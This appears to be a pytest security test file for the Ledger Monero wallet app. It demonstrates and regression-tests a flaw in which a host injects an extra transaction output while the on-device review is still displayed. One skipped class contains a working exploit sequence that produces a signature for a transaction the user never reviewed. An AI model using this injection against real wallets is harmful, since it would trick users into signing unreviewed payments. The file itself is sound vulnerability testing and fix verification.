"""
Async TOCTOU: the tx is mutated while the review is on screen.

Where test_vuln_nbgl_review_skip.py shows the final review can be skipped, this
shows that even when a review is displayed the tx can still be mutated under it,
so the signed message no longer matches what was shown.

On NBGL, start_signature() calls nbgl_useCaseReview (async) and returns; app_main
parks in monero_io_do(IO_ASYNCH_REPLY). In the legacy IO stack, finger/button
events and incoming APDUs share one queue with no interlock between "review
pending" and "process next APDU". So a host that sends another INS_VALIDATE/P1=2
(prehash update) before the user taps wins: the APDU is dispatched and the new
output is folded into the running keccak_H prehash while the review is still up.
(The state machine allows it: after the "last" update another P1=2 with the next
p2 is accepted.)

What the test proves, in one session:
  1. the review is shown for the outputs declared final, not yet confirmed;
  2. while it's up, the host injects a third output (INS_VALIDATE/P1=2/P2=3) and
     the device processes it (SW_OK) before the user confirms;
  3. the user confirms a review that never showed output 3, and the finalized
     pre-MLSAG hash commits to it -- so the signed tx differs from the reviewed one.

We don't compare mlsagH across sessions: speculos randomizes r per open_tx, so
that diff would be meaningless. The proof is the in-session mid-review acceptance.

Needs a DEBUG=1 build and ragger >= 1.45.2 (older ragger serializes the injected
APDU, so the test skips rather than false-pass). Coverage:
  * NBGL (Stax/Flex): TestAsyncReviewTotouVuln (exploit, @skip on fixed build) and
    TestAsyncReviewLocked (fix check: asserts 0x6980 + app exit).
  * BAGL (Nano S+/X): TestAsyncReviewLockedNano -- same check via the fee review.

The fix verified here is the local app-side gate (app_main + monero_io_do), not
the SDK consent-lock: a command arriving mid-review is answered with
SW_COMMAND_NOT_ALLOWED (0x6980) and the app exits to the dashboard (fail-closed),
so the review is torn down rather than kept on screen.

Hardware note: on a fixed build the injection makes the app exit, so the device
returns to the dashboard on its own -- no manual Reject needed.
(Invisible on speculos -- the emulator is torn down per class.)

Run:  pytest tests/test_vuln_nbgl_review_toctou.py -v --device flex  (or nanosp / nanox)
"""

import struct
import threading
import time

import pytest

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

# IN_OPTION_MORE_COMMAND (0x80) | short-amount flag (0x02).
OPT_MORE = 0x80 | 0x02
OPT_SHORT = 0x02
ZERO_COMMITMENT = bytes(32)

# SW returned by the app's IO gate (send_error_and_kill_app) when a command
# arrives while a confirmation is still on screen. The app answers this, then
# exits to the dashboard (fail-closed), so the pending review is torn down.
SW_COMMAND_NOT_ALLOWED = 0x6980


def _output_payload(recv: Keys, ak: bytes, blinded_mask: bytes, blinded_amount: bytes,
                    is_change: bool) -> bytes:
    """The INS_VALIDATE output record an honest host streams per destination."""
    return b"".join((
        b"\x00",                                # is_subaddress
        b"\x01" if is_change else b"\x00",      # is_change
        recv.public_view_key,
        recv.public_spend_key,
        ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT,
        blinded_mask,
        blinded_amount,
    ))


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes) -> bytes:
    """Full APDU bytes in the app's framing (option is the first data byte,
    Lc = 1 + len(payload)) — same encoding as monero_client.io.Transport."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _setup_through_blind(monero: MoneroCmd, backend: BackendInterface,
                         navigator: Navigator, test_name, state):
    """Drive a 2-output REAL tx up to (but excluding) INS_VALIDATE — i.e. reset,
    keys, open, gen_txout, prefix hash, commitment masks, blinds. None of these
    steps trigger a review (timelock=0), so it runs identically on NBGL and BAGL
    with no navigation."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    pv, ps, addr = monero.get_public_keys()
    s = Keys(public_view_key=pv, public_spend_key=ps,
             secret_view_key=None, secret_spend_key=None, addr=addr)
    state["sender"] = s
    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
    state["tx_pub_key"] = tx_pub_key
    state["_tx_priv_key"] = tx_priv_key

    recv = [s, s]
    for i in range(2):
        ak, eph, _ = monero.gen_txout_keys(
            _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
            dst_pub_view_key=recv[i].public_view_key,
            dst_pub_spend_key=recv[i].public_spend_key,
            output_index=i, is_change_addr=(i == 1), is_subaddress=False)
        state["ak"][i].append(ak)
        state["eph"].append(eph)

    monero.prefix_hash_init(test_name, backend.device, navigator=navigator,
                            version=0, timelock=0)
    monero.prefix_hash_update(
        index=1,
        payload=build_tx_prefix_outkeys(vout_keys=state["eph"], tx_pubkey=tx_pub_key),
        is_last=True)

    # All commitment masks first, then all blinds (the state machine forbids
    # going back to INS_GEN_COMMITMENT_MASK once INS_BLIND has started).
    masks = [monero.gen_commitment_mask(state["ak"][i][0]) for i in range(2)]
    for i in range(2):
        m, a = monero.blind(_ak_amount=state["ak"][i][0], mask=masks[i],
                            amount=state["amount"][i], is_short=True)
        state["bm"][i].append(m)
        state["ba"][i].append(a)


def _inject_during_review(backend: BackendInterface, apdu: bytes,
                          review_marker: str = None, timeout: float = 8.0):
    """Send `apdu` while a review is pending (a prior reply is deferred), in a
    daemon thread, and observe how the device reacts. Returns ``(sw, processed)``:

      * ``sw`` (int): the device ANSWERED. A fixed build's IO gate replies
        SW_COMMAND_NOT_ALLOWED (0x6980) and then exits to the dashboard; an
        NBGL-vulnerable build auto-confirms the injected output and replies
        0x9000. ``processed`` is False.
      * ``(None, True)``: the exchange BLOCKED *and* ``review_marker`` is no longer
        on screen — the injection was dispatched and the device moved on to the
        injected output's own (deferred) review. This is the BAGL-vulnerable
        signature (the injected output mutated the tx); the caller must FAIL.
      * ``(None, False)``: the exchange blocked and the original review is still on
        screen — speculos serialized the concurrent APDU and never delivered it
        (the device gate could not be exercised); the caller should SKIP.

    Delivery depends on the transport: real hardware (and some speculos versions)
    deliver the concurrent APDU; other speculos versions queue it behind the still-
    open deferred reply and never deliver it, so the exchange blocks forever."""
    result: dict = {}

    def _run():
        try:
            result["sw"] = backend.exchange_raw(apdu).status
        except ExceptionRAPDU as exc:
            result["sw"] = exc.status
        except Exception as exc:  # transport teardown etc.
            result["error"] = repr(exc)

    th = threading.Thread(target=_run, daemon=True)
    th.start()
    th.join(timeout=timeout)
    if not th.is_alive():
        if "error" in result:
            raise AssertionError(f"injection transport error: {result['error']}")
        return (result.get("sw"), False)
    # Blocked: tell "processed but its own review now deferred" (review screen
    # changed) apart from "never delivered" (review screen unchanged).
    processed = review_marker is not None and not backend.compare_screen_with_text(review_marker)
    return (None, processed)


_NOT_DELIVERED_SKIP = ("the concurrent injection was not delivered to the device — the ragger "
                       "speculos client serialized it behind the pending review's deferred reply. "
                       "This happens with ragger < 1.45.2; use ragger >= 1.45.2 (pinned in "
                       "tests/requirements.txt) so the 0x6980 rejection can be verified.")


@pytest.mark.skip(reason="Demonstrates the (now-fixed) async TOCTOU; passes only on a "
                         "build WITHOUT the async-review fix. Remove this skip to re-confirm the "
                         "exploit against a vulnerable build.")
@pytest.mark.incremental
class TestAsyncReviewTotouVuln:
    """A third output is appended to the transaction while the review of the
    first outputs is on screen, before the user confirms."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL-only async review (Stax/Flex)")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {
            "sender": None,
            "amount": [907880000, 0],   # out0 destination, out1 change
            "tx_pub_key": None,
            "_tx_priv_key": None,
            "ak": [[], []],
            "bm": [[], []],
            "ba": [[], []],
            "eph": [],
        }

    # --------------------------------------------------------------- build tx
    @staticmethod
    def test_setup_until_validate(monero: MoneroCmd, backend: BackendInterface,
                                  navigator: Navigator, test_name, state):
        _setup_through_blind(monero, backend, navigator, test_name, state)
        monero.validate_prehash_init(test_name, backend.device, navigator, 1, 0, 30660000)

    # --------------------------------------------------------------- attack
    @staticmethod
    def test_inject_output_during_review(monero: MoneroCmd, backend: BackendInterface, state):
        s = state["sender"]

        # output 0 (visible destination): MORE set -> auto-confirmed, no UI.
        monero.transport.send(cla=PROTOCOL_VERSION, ins=InsType.INS_VALIDATE, p1=2, p2=1,
                              option=OPT_MORE,
                              payload=_output_payload(s, state["ak"][0][0], state["bm"][0][0],
                                                      state["ba"][0][0], is_change=False))
        sw, _ = monero.transport.recv()
        assert sw & 0x9000
        backend.wait_for_text_on_screen("Processing")

        # output 1 (change): HONEST "last" (MORE clear) -> triggers nbgl_useCaseReview.
        # Write it WITHOUT reading a response: the device shows the review and parks
        # in io_exchange(IO_ASYNCH_REPLY), deferring output 1's reply until the user
        # confirms. We never confirm, so that reply is never produced (see below).
        last_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=2, option=OPT_SHORT,
                              payload=_output_payload(s, state["ak"][1][0], state["bm"][1][0],
                                                      state["ba"][1][0], is_change=True))
        backend.send_raw(last_apdu)
        time.sleep(1.5)
        assert backend.compare_screen_with_text("Review Transaction"), (
            "expected the transaction review to be on screen"
        )

        # ---- INJECTION: a 3rd output (INS_VALIDATE/P1=2/P2=3), MORE set ----
        # Sent on the APDU channel while output 1's review is displayed and
        # unconfirmed. The legacy IO stack has no interlock, so the device dispatches
        # it: monero_apdu_mlsag_prehash_update folds output 3 into the running
        # keccak_H prehash, then its auto-confirm path (ui_menu_validation_action_confirm)
        # returns SW_OK *and* draws nbgl_useCaseSpinner("Processing TX") — which tears
        # down the review the user was reading. Done in a thread so a hypothetical
        # interlock (fixed build) surfaces as a still-alive thread, not a hang.
        injected_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=3, option=OPT_MORE,
                                  payload=_output_payload(s, state["ak"][0][0], state["bm"][0][0],
                                                          state["ba"][0][0], is_change=False))
        result: dict = {}

        def _inject():
            try:
                result["status"] = backend.exchange_raw(injected_apdu).status
            except ExceptionRAPDU as exc:      # device returned a non-9000 SW
                result["status"] = exc.status
            except Exception as exc:           # transport/other failure
                result["error"] = repr(exc)

        th = threading.Thread(target=_inject)
        th.start()
        th.join(timeout=8)

        assert not th.is_alive(), (
            "TOCTOU not reproduced: the injected APDU never completed — the device "
            "appears to block TX data while a review is pending (fixed?)."
        )
        assert "error" not in result, f"injection transport error: {result.get('error')}"
        assert result.get("status") == 0x9000, (
            f"injected output not accepted mid-review (status={result.get('status'):#06x}); "
            "a fixed device should reject TX-mutating APDUs while a review is pending."
        )

        # The injection's auto-confirm replaced the review with the spinner; output 1
        # was never confirmed and its reply is never sent (so we deliberately never
        # read one). The device is now parked waiting for the next APDU — and will
        # happily finalize/sign (next test), having shown the user a review for a
        # recipient set that no longer matches what gets signed.
        backend.wait_for_text_on_screen("Processing")
        print(
            "\n[confirmed] output 3 was appended to the transaction while the "
            "review of outputs 0/1 was displayed and unconfirmed (SW_OK before any user "
            "approval), and the injection tore the review off-screen — no interlock "
            "exists between a pending NBGL review and incoming APDUs."
        )

    # --------------------------------------------------------------- finalize
    @staticmethod
    def test_finalize_signs_mutated_tx(monero: MoneroCmd, state):
        """The device finalizes and returns the 32-byte pre-MLSAG hash. That hash
        was computed over a keccak_H that includes output 3 (folded in mid-review),
        so the signed message commits to an output the user never reviewed."""
        s = state["sender"]
        mlsag_h = None
        for idx, is_last in ((1, False), (2, True)):
            i = idx - 1
            payload = _output_payload(s, state["ak"][i][0], state["bm"][i][0],
                                      state["ba"][i][0], is_change=(i == 1))
            monero.transport.send(cla=PROTOCOL_VERSION, ins=InsType.INS_VALIDATE, p1=3, p2=idx,
                                  option=(0x00 if is_last else 0x80), payload=payload)
            sw, data = monero.transport.recv()
            assert sw & 0x9000, hex(sw)
            if is_last:
                mlsag_h = data

        assert mlsag_h is not None and len(mlsag_h) == 32
        print(f"[toctou] device produced pre-MLSAG hash for the mutated tx: {mlsag_h.hex()}")

    @staticmethod
    def test_close_tx(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestAsyncReviewLocked:
    """Fix verification for (b) -- local app-side IO gate (no SDK lock).

    app_main tracks an "a reply is still owed" flag (G_monero_vstate.io_reply_pending):
    armed when a command is received, cleared by monero_io_do when its reply is sent.
    A command that arrives while a confirmation is on screen (reply still owed) is
    refused by send_error_and_kill_app(SW_COMMAND_NOT_ALLOWED) -- the app answers
    0x6980 and then app_exit()s (fail-closed), so the review is torn down rather
    than kept on screen (the difference from the SDK lock).

    The test asserts the injection is answered with 0x6980, which is emitted only
    by that kill path. The torn-down screen can't be asserted directly: on
    speculos app_exit() stops the emulator, on hardware it returns to the dashboard.

    The honest review->confirm->finalize path is unaffected and is covered by the
    regression suite (e.g. tests/test_sig_real_simple.py)."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL-only async review (Stax/Flex)")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"sender": None, "amount": [907880000, 0], "tx_pub_key": None,
                "_tx_priv_key": None, "ak": [[], []], "bm": [[], []], "ba": [[], []], "eph": []}

    @staticmethod
    def test_setup_until_validate(monero: MoneroCmd, backend: BackendInterface,
                                  navigator: Navigator, test_name, state):
        TestAsyncReviewTotouVuln.test_setup_until_validate(
            monero, backend, navigator, test_name, state)

    @staticmethod
    def test_injection_rejected_during_review(monero: MoneroCmd, backend: BackendInterface,
                                              state):
        s = state["sender"]

        # output 0: auto-confirmed (MORE set), no UI.
        monero.transport.send(cla=PROTOCOL_VERSION, ins=InsType.INS_VALIDATE, p1=2, p2=1,
                              option=OPT_MORE,
                              payload=_output_payload(s, state["ak"][0][0], state["bm"][0][0],
                                                      state["ba"][0][0], is_change=False))
        assert monero.transport.recv()[0] & 0x9000
        backend.wait_for_text_on_screen("Processing")

        # output 1: "last" (MORE clear) -> review. Write-only; device defers reply.
        last_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=2, option=OPT_SHORT,
                              payload=_output_payload(s, state["ak"][1][0], state["bm"][1][0],
                                                      state["ba"][1][0], is_change=True))
        backend.send_raw(last_apdu)
        time.sleep(1.0)
        assert backend.compare_screen_with_text("Review Transaction")

        # Inject a 3rd output while the review is displayed. With the fix, the
        # device rejects it and stays parked on the review (output 1 still deferred).
        injected_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=3, option=OPT_MORE,
                                  payload=_output_payload(s, state["ak"][0][0], state["bm"][0][0],
                                                          state["ba"][0][0], is_change=False))
        # NBGL: a vulnerable build auto-confirms the injected MORE-output and
        # answers 0x9000 immediately (no review), so an answered SW that is not
        # 0x6980 is the vulnerability.
        sw, _ = _inject_during_review(backend, injected_apdu)
        if sw is None:
            pytest.skip(_NOT_DELIVERED_SKIP)
        assert sw == SW_COMMAND_NOT_ALLOWED, (
            f"expected the app IO gate to reject the injection with "
            f"{SW_COMMAND_NOT_ALLOWED:#06x}, got {sw:#06x} (0x9000 = injection accepted = vulnerable)"
        )

        # 0x6980 is emitted only by send_error_and_kill_app, so it already means
        # "rejected and exited fail-closed" (review torn down, tx not mutated) --
        # the visible difference from the SDK lock, which keeps the review on
        # screen. We can't probe the screen afterwards: on speculos app_exit()
        # tears the emulator down (its HTTP API goes away), and on hardware it
        # returns to the dashboard.
        print("\n[FIXED] mid-review injection rejected with "
              f"{SW_COMMAND_NOT_ALLOWED:#06x}; the app exited fail-closed and the "
              "transaction was not mutated.")


@pytest.mark.incremental
class TestAsyncReviewLockedNano:
    """Fix verification for (b) on BAGL (Nano S+ / Nano X).

    BAGL has no silent auto-confirm: every fee / output is shown in its own
    *blocking* review (ux_flow_*), so the app defers its APDU reply while a review
    is on screen. The same app_main gate ("a reply is owed") therefore rejects any
    APDU that arrives mid-review on Nano too — same code, no UI/app hooks, identical
    to NBGL.

    Here we hold the device on the *fee* review (the first blocking review on
    BAGL) and inject an output (INS_VALIDATE/P1=2). That output would fold a new
    destination into the prehash; it must be rejected with 0x6980 and the app must
    exit (fail-closed), tearing down the review."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nano_only(device):
        if not device.is_nano:
            pytest.skip("BAGL-only (Nano S+/X); NBGL is covered by TestAsyncReviewLocked")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"sender": None, "amount": [907880000, 0], "tx_pub_key": None,
                "_tx_priv_key": None, "ak": [[], []], "bm": [[], []], "ba": [[], []], "eph": []}

    @staticmethod
    def test_setup_through_blind(monero: MoneroCmd, backend: BackendInterface,
                                 navigator: Navigator, test_name, state):
        _setup_through_blind(monero, backend, navigator, test_name, state)

    @staticmethod
    def test_injection_rejected_during_review(monero: MoneroCmd, backend: BackendInterface,
                                              state):
        s = state["sender"]

        # Send the fee APDU (INS_VALIDATE/P1=1) write-only: on BAGL this draws the
        # blocking fee review and the app defers its reply (parked awaiting input).
        fee_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=1, p2=1, option=0x00,
                             payload=b"\x00" + encode_varint(30660000))
        backend.send_raw(fee_apdu)
        time.sleep(1.0)
        assert backend.compare_screen_with_text("Fee"), "expected the fee review on screen"

        # Inject an output update while the fee review is pending.
        # On a fixed build the app gate rejects it (0x6980) and the app exits.
        # On a VULNERABLE BAGL build there is no gate: the output is dispatched, the
        # app shows the injected output's OWN blocking review and defers — so the
        # exchange blocks AND the fee review is replaced. _inject_during_review tells
        # those apart via the on-screen marker.
        injected_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=1, option=OPT_MORE,
                                  payload=_output_payload(s, state["ak"][0][0], state["bm"][0][0],
                                                          state["ba"][0][0], is_change=False))
        sw, processed = _inject_during_review(backend, injected_apdu, review_marker="Fee")
        if processed:
            pytest.fail("VULNERABLE: the injected output was processed mid-review — the fee "
                        "review was replaced by the injected output's review (tx mutated).")
        if sw is None:
            pytest.skip(_NOT_DELIVERED_SKIP)
        assert sw == SW_COMMAND_NOT_ALLOWED, (
            f"expected the app IO gate to reject the injection with "
            f"{SW_COMMAND_NOT_ALLOWED:#06x}, got {sw:#06x}"
        )
        # As on NBGL, 0x6980 (emitted only by send_error_and_kill_app) is the
        # definitive signal: rejected and exited fail-closed. We can't probe the
        # screen after the exit -- speculos tears the emulator down, hardware
        # returns to the dashboard.
        print("\n[FIXED on BAGL] output injected during the fee review was "
              f"rejected with {SW_COMMAND_NOT_ALLOWED:#06x}; app exited fail-closed, tx not mutated.")
